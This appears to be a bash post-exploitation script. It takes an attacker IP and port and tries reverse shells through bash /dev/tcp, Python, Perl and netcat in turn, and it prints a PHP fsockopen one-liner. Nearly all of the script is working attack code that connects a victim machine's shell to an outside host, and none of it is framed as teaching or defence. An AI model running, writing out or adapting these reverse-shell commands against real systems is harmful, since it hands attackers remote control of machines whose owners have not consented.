#!/bin/bash

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"

if [ -z $1 ]
then
	echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi

if [ -z $2 ]
then
    echo -e "${RED}[*] Syntax: <ATTACKER IP> <PORT> ${ENDCOLOR}"
    exit 1
fi


echo -e "\n${YELLOW}[+] 1. BASH${ENDCOLOR}"

which bash > /dev/null 2>&1 
a=$(echo $?)

if [[ $a =~ 0 ]]
then
   echo -e "\n${GREEN}Bash Founded!${ENDCOLOR}\n"
   bash -i >& /dev/tcp/$1/$2 0>&1 2>/dev/null
else
   echo -e "${RED}Bash not found${ENDCOLOR}"
fi


echo -e "\n${YELLOW}[+] 2. PYTHON${ENDCOLOR}"

which python > /dev/null 2>&1
b=$(echo $?)

if [[ $b =~ 0 ]]
then
   echo -e "\n${GREEN}Python Founded!${ENDCOLOR}\n"
   python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>/dev/null
   python2 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" 2>/dev/null
else
   python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$1',$2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" > /dev/null 2>&1 
   echo -e "${RED}Python not found${ENDCOLOR}"
fi

echo -e "\n${YELLOW}[+] 3. PERL${ENDCOLOR}"

which perl > /dev/null 2>&1
c=$(echo $?)

if [[ $c =~ 0 ]]
then
   echo -e "\n${GREEN}Perl Founded!${ENDCOLOR}\n"
   export pene=$1
   export penee=$2
   perl -e 'use Socket;$i=$ENV{"pene"};$p=$ENV{penee};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'   
else
   echo -e "${RED}Perl not found${ENDCOLOR}"
fi

echo -e "\n${YELLOW}[+] 4. PHP${ENDCOLOR}"

which php > /dev/null 2>&1 
d=$(echo $?)

if [[ $d =~ 0 ]]
then
   export plis=$1
   export plos=$2
   echo -e "\n${GREEN}PHP Founded!${ENDCOLOR}\n"
   echo -e "Execute this command with your IP:"
   echo -e "\n${BLUE}php -r '$sock=fsockopen(\"127.0.0.1\",'$2');exec(\"/bin/sh -i <&3 >&3 2>&3\");'${ENDCOLOR}"
else
   echo -e "${RED}PHP not found${ENDCOLOR}"
fi

echo -e "\n${YELLOW}[+] 5. NETCAT${ENDCOLOR}"

which nc > /dev/null 2>&1 
e=$(echo $?)

if [[ $e =~ 0 ]]
then
   echo -e "\n${GREEN}Netcat Founded!${ENDCOLOR}\n"
   nc -e /bin/sh $1 $2 > /dev/null 2>&1
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f > /dev/null 2>&1
else
   echo -e "${RED}Netcat not found${ENDCOLOR}"
fi

